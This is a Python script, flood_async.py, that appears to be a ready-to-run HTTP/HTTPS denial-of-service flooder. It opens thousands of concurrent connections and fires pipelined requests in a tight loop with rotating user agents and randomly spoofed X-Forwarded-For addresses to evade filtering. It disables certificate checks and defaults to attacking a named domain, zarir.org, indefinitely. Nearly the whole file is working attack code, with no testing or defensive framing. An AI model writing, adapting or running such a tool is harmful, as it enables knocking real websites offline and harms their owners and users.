#!/usr/bin/env python3
"""
flood_async.py - zero-latency asyncio HTTP/HTTPS flooder
Usage: python3 flood_async.py [url] [-c CONCURRENCY] [-d SECONDS]
"""

import argparse
import asyncio
import random
import socket
import ssl
import time
import urllib.parse

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "curl/8.6.0",
    "Go-http-client/2.0",
]

sent = 0
errors = 0
lock = asyncio.Lock()


def build_requests(host, path, method):
    """Precompile request bytes ONCE - zero per-request CPU cost."""
    reqs = []
    for ua in USER_AGENTS:
        req = (f"{method} {path} HTTP/1.1\r\n"
               f"Host: {host}\r\n"
               f"User-Agent: {ua}\r\n"
               f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
               f"Accept-Language: en-US,en;q=0.9\r\n"
               f"Accept-Encoding: gzip, deflate\r\n"
               f"Connection: keep-alive\r\n"
               f"Cache-Control: no-cache\r\n"
               f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
               f"\r\n").encode()
        reqs.append(req)
    return reqs


async def hammer(host, port, ssl_ctx, reqs, sem):
    global sent, errors
    while True:
        try:
            reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx)
            # TCP_NODELAY: disable Nagle - no packet delay
            sock = writer.get_extra_info("socket")
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            while True:
                writer.write(random.choice(reqs))   # zero delay, tight loop
                sent += 1
                if writer.transport.get_write_buffer_size() > 65536:
                    await writer.drain()
                try:
                    await asyncio.wait_for(reader.read(1024), timeout=0.02)
                except asyncio.TimeoutError:
                    pass
                except Exception:
                    break
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except Exception:
            errors += 1
            await asyncio.sleep(0.02)   # backoff only on hard connection failure


async def stats(start, duration):
    while True:
        await asyncio.sleep(5)
        elapsed = time.time() - start
        print(f"[{time.strftime('%H:%M:%S')}] sent={sent} errors={errors} "
              f"rate={sent/elapsed:.0f} req/s", flush=True)


async def main():
    ap = argparse.ArgumentParser(description="Zero-latency asyncio flooder")
    ap.add_argument("url", nargs="?", default="https://zarir.org")
    ap.add_argument("-c", "--concurrency", type=int, default=3000)
    ap.add_argument("-d", "--duration", type=int, default=0, help="seconds, 0 = until Ctrl+C")
    ap.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "HEAD"])
    args = ap.parse_args()

    target = args.url if "://" in args.url else "https://" + args.url
    p = urllib.parse.urlparse(target)
    host = p.hostname or "zarir.org"
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query

    ssl_ctx = None
    if p.scheme == "https":
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE   # skip TLS verification = lower latency
        ssl_ctx.set_ciphers("AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256")

    reqs = build_requests(host, path, args.method)
    print(f"[*] Target: {host}:{port} ({'HTTPS' if ssl_ctx else 'HTTP'})")
    print(f"[*] Concurrency: {args.concurrency} | Method: {args.method} | Path: {path}")

    start = time.time()
    asyncio.create_task(stats(start, args.duration))
    tasks = [asyncio.create_task(hammer(host, port, ssl_ctx, reqs, None))
             for _ in range(args.concurrency)]

    try:
        if args.duration > 0:
            await asyncio.sleep(args.duration)
        else:
            while True:
                await asyncio.sleep(3600)
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass
    finally:
        for t in tasks:
            t.cancel()
        print(f"\n[*] Done. Total: {sent} | Errors: {errors} | "
              f"Avg rate: {sent/(time.time()-start):.0f} req/s")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
